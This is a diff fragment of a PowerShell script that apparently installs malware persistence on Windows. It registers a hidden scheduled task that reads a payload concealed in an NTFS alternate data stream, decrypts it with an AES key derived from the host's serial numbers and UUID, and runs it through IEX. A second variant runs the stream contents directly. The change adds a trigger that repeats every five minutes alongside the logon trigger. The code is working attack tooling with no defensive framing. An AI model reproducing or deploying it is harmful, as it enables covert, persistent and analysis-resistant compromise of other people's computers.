@@ -250,7 +250,9 @@ if ($Persist -eq 'task') {
 `$adsPath=`$hp+':'+`$sn
 `$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e='''';gc '''+`$adsPath+'''|%{`$e+=`$_+[char]10};`$p=Dec `$e `$k;IEX `$p'
 `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `$taskCmd"
-`$t=New-ScheduledTaskTrigger -AtLogOn
+`$t1=New-ScheduledTaskTrigger -AtLogOn
+`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+`$t=@(`$t1,`$t2)
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
 
@@ -261,7 +263,9 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Fo
 `$adsPath=`$hp+':'+`$sn
 `$cmd="IEX((gc '`$adsPath')-join[char]10)"
 `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `$cmd"
-`$t=New-ScheduledTaskTrigger -AtLogOn
+`$t1=New-ScheduledTaskTrigger -AtLogOn
+`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+`$t=@(`$t1,`$t2)
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
 
